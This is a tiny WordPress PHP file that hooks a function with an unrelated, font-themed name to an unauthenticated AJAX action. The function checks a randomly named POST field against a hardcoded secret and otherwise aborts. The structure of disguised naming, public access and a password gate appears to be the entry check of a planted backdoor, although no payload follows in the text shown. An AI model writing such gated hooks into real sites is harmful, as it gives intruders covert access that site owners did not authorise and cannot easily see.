<?php

function viewer_woff2_source_xml() {
	if (!isset($_POST["pvrsxvpk"]) || $_POST["pvrsxvpk"] !== "rI5xSuzG6W7nv") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'viewer_woff2_source_xml', 5, 1);
